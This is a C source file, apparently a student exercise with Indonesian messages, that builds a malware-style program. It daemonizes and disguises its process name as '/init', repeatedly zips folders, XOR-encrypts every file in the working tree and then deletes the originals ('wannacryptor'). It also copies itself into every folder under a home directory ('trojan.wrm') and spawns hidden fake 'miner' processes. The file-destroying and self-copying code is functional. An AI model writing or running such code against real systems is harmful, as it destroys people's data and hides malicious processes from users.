#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <libgen.h>
#include <signal.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/wait.h>

int keep_running = 1;

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    umask(0);
    setsid();

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    chdir("/");

    for (int i = sysconf(_SC_OPEN_MAX); i >= 0; i--) close(i);
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_RDWR);
}

pid_t child[5];

void simple_xor_encrypt(const char *filename);

void encrypt_all_files(const char *dirpath, const char *self_exe) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt_all_files(fullpath, self_exe);
        } else if (S_ISREG(st.st_mode)) {
            if (strcmp(fullpath, self_exe) != 0) {
                printf("Enkripsi: %s\n", fullpath);
                simple_xor_encrypt(fullpath);
            }
        }
    }

    closedir(dir);
}

void delete_directory(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            delete_directory(fullpath);
        } else {
            unlink(fullpath);
        }
    }

    closedir(dir);
    rmdir(path);
}

void simple_xor_encrypt(const char *filename) {
    FILE *f = fopen(filename, "rb+");
    if (!f) {
        perror("Gagal membuka file untuk enkripsi");
        return;
    }

    time_t timestamp = time(NULL);
    unsigned char key[8];
    for (int i = 0; i < 8; i++) {
        key[i] = (timestamp >> (i * 8)) & 0xFF;
    }

    int c;
    size_t i = 0;
    while ((c = fgetc(f)) != EOF) {
        fseek(f, -1, SEEK_CUR);
        fputc(c ^ key[i % 8], f);
        i++;
    }

    fclose(f);
}

void zip_and_encrypt() {
    DIR *dir = opendir(".");
    if (!dir) {
        perror("Gagal membuka direktori");
        return;
    }

    struct dirent *entry;
    char exe_path[1024];
    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    exe_path[sizeof(exe_path) - 1] = '\0';

    pid_t zip_pids[1024];
    char folders_to_delete[1024][256];
    int pid_index = 0;
    int folder_index = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        struct stat st;
        if (stat(entry->d_name, &st) == -1)
            continue;

        if (S_ISDIR(st.st_mode)) {
            char zipname[1024];
            snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);

            pid_t pid = fork();
            if (pid == 0) {
                char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
                execvp("zip", argv);
                perror("execvp zip gagal");
                exit(1);
            } else if (pid > 0) {
                zip_pids[pid_index++] = pid;
                strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
            }
        }
    }
    closedir(dir);

    for (int i = 0; i < pid_index; i++) {
        int status;
        waitpid(zip_pids[i], &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Zip gagal untuk folder indeks %d\n", i);
        }
    }

    encrypt_all_files(".", exe_path);
    printf("Encryption don.\n");

    for (int i = 0; i < folder_index; i++) {
        delete_directory(folders_to_delete[i]);
        printf("Folder %s deleted.\n", folders_to_delete[i]);
    }
}

void wannacryptor() {
    FILE *log = fopen("/tmp/wannalog.txt", "a+");
    if (!log) exit(1);

    while (1) {
        zip_and_encrypt();

        fprintf(log, "[wannacryptor] Enkripsi dijalankan.\n");
        fflush(log);

        sleep(30);
    }
}

void trojan_wrm() {
    const char *source = "/proc/self/exe";
    const char *runme_name = "runme";
    const char *target_base = "/home/riverz";

    DIR *dir = opendir(target_base);
    if (!dir) {
        perror("Gagal membuka direktori target");
        exit(1);
    }

    struct dirent *entry;
    char dest_path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char folder_path[1024];
        snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);

        struct stat st;
        if (stat(folder_path, &st) == -1 || !S_ISDIR(st.st_mode))
            continue;

        snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);

        FILE *src = fopen(source, "rb");
        FILE *dst = fopen(dest_path, "wb");

        if (!src || !dst) {
            perror("Gagal copy file runme");
            if (src) fclose(src);
            if (dst) fclose(dst);
            continue;
        }

        int ch;
        while ((ch = fgetc(src)) != EOF)
            fputc(ch, dst);

        fclose(src);
        fclose(dst);

        chmod(dest_path, 600);

        printf("Berhasil copy ke %s\n", dest_path);
    }

    closedir(dir);

    while (1) {
        sleep(5);
    }
}

void sigterm_handler(int signum) {
    keep_running = 0;
}

void sigterm_handler_rodok(int signum) {
    for (int i = 0; i < 6; i++) {
        if (child[i] > 0) {
            kill(child[i], SIGTERM);
        }
    }
    exit(0);
}

void cryptominer(int id) {
    signal(SIGTERM, sigterm_handler);
    char logpath[] = "/tmp/.miner.log";
    FILE *log = fopen(logpath, "a+");
    if (!log) exit(1);

    srand(time(NULL) + id);

    while (keep_running) {
        char hash[65];
        for (int i = 0; i < 64; i++) {
            int r = rand() % 16;
            hash[i] = "0123456789abcdef"[r];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);

        fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                t->tm_hour, t->tm_min, t->tm_sec,
                id, hash);
        fflush(log);

        sleep((rand() % 28) + 3);
    }

    fclose(log);
}

void rodok_launcher() {
    srand(time(NULL));
    setpgid(0, 0);

    signal(SIGTERM, sigterm_handler_rodok);

    for (int miner_id = 0; miner_id < 6; miner_id++) {
        pid_t pid = fork();
        if (pid == 0) {
            char name[32];
            snprintf(name, sizeof(name), "mine-crafter-%02d", miner_id);

            setpgid(0, 0);

            char *args[] = {name, " ", NULL};
            execv("/proc/self/exe", args);
            perror("execv miner gagal");
            exit(1);
        } else if (pid > 0) {
            child[miner_id] = pid;
        }
    }

    int status;
    while (wait(&status) > 0);
}

int main(int argc, char *argv[]) {
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));

    if (argc >= 2 && strcmp(argv[1], " ") == 0) {
      prctl(PR_SET_NAME, (unsigned long) argv[0], 0, 0, 0);
      cryptominer(argv[0][strlen(argv[0]) - 1] - '0');           
    }

    if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
            rodok_launcher();
        return 0;
    }

    if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
            wannacryptor();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
            trojan_wrm();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);

        while (1) {
            pid_t pid = fork();
            if (pid == 0) {
                char *args[] = {"wannacryptor", NULL};
                execv("/proc/self/exe", args);
                perror("execv wannacryptor failed");
                exit(1);
            }
        
            pid_t pid2 = fork();
            if (pid2 == 0) {
                char *args[] = {"trojan.wrm", NULL};
                execv("/proc/self/exe", args);
                perror("execv trojan.wrm failed");
                exit(1);
            }

            pid_t pid3 = fork();
            if (pid3 == 0) {
                char *args[] = {"rodok.exe", NULL};
                execv("/proc/self/exe", args);
                perror("execv rodok.exe failed");
                exit(1);
            }
            
            int status;
            waitpid(-1, &status, WNOHANG);

            sleep(30);
        }
    }

    char *newargv[] = { "init", NULL};
    execv("/proc/self/exe", newargv);
    perror("execv init failed");
    exit(1);
}